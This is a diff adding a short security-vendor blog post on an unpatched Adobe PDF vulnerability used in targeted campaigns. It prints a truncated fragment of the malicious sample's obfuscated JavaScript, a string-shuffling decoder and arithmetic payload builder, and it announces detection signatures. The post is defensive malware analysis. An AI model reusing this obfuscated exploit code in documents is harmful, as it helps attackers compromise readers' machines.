@@ -1,0 +1,10 @@
+
+Much like other vendors in the security space, the VRT spent yesterday scrambling to address the latest Adobe/PDF vulnerability. The attack - which works across multiple operating systems, bypasses Adobe's sandbox, and which has been used in recent targeted campaigns - is still without a patch, as Adobe mobilizes their response organization to address the matter.
+
+Upon first opening the sample, it was blatantly obvious that something fishy was going on, as the first content in the file was a ~400K+ block of highly obfuscated JavaScript:
+
+
+/JS (0 >> 0 >> 0 >> 0 >> 0 >> 0;function sHOGG\(c,d,e\){    var idx = d % c.length;    var s = "";    while \(s.length < c.length\){        s += c[idx];        idx = \(idx + e\) % c.length;    }    return s;}0 >> 0 >> 0 >> 0 >> 0 >> 0;function oTHERWISE\(pRENDENDO,t\){ if\(pRENDENDO == sHOGG\('014.031.4.',3571,9173\)\){ var r="";r+=ue\(t+2*2*2*3+11*3\);r+=ue\(t+11*5+2\);r+=ue\(t+19*3\);r+=ue\(t+3*19\);r+=ue\(t+19*3\);r+=ue\(t+43+7*2\);r+=ue\(t+11*2+5*7\);r+=ue\(t+19*3\);r+=ue\(t+3*3*2*2+7*3\);r+=ue\(t+11*3+2*2*3*2\);r+=ue\(t+2*7+43\);r+=ue\(t+19*3\);r+=ue\(t+3*19\);r+=ue\(t+19*3\);r+=ue\(t+19*3\);r+=ue\(t+3*19\);r+=ue\(t+31+13*2\);r+=ue\(t+19*3\);r+=ue\(t+5+2*2*13\);
+
+We're currently testing signatures that would detect files like these on a generic level - while JavaScript in PDFs is nothing new, typically that script is small, well-defined, and represents a much smaller portion of the overall file size. In the meantime, we are releasing today SIDs 25818 and 25819 to counter this particular threat, and 25817 to detect command and control traffic associated with this campaign. 
+
